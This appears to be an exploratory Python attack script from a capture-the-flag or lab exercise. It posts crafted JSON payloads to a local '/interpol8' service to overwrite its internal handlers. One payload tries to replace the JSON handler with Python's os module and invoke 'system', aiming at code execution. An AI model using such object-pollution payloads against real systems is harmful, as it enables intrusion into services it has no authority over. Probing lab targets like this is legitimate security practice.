#!/usr/bin/env python3
import requests
import json
import os

URL = "http://localhost:6969/interpol8"

# The vulnerability is that we can overwrite the handlers!
# When doc1 sets yaml_handler to something else, doc2 can then use it

# Test 1: Try to overwrite yaml_handler
print("=== Test 1: Overwrite yaml_handler ===")
payload = {
    "doc1": '{"yaml_handler": {"test": "malicious"}}',
    "doc2": '{"dummy": "data"}',
    "type1": "json",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}\n")

# Test 2: Overwrite json_handler module
print("=== Test 2: Try to inject into handler ===")
# The idea: overwrite json_handler with os module, then call it
payload = {
    "doc1": '{"json_handler": "os"}',
    "doc2": 'system',
    "type1": "json",  
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}\n")

# Test 3: Check if handlers persist through merge
print("=== Test 3: Handler persistence ===")
# What if we create a scenario where holder1 overwrites its own handler
# And then when we try to use it for output, it calls our malicious handler?

# First, let's understand: the handlers are used in to_yaml, to_json, to_xml
# If we can overwrite json_handler.dumps with something else...

payload = {
    "doc1": '{"json_handler.dumps": "leaked"}',
    "doc2": '{"dummy": "data"}',
    "type1": "json",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}\n")

# Test 4: Can we access the environment through the Flask app?
print("=== Test 4: Access app environment ===")
payload = {
    "doc1": '{"app": "test"}',
    "doc2": '{"dummy": "data"}',
    "type1": "json",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}\n")
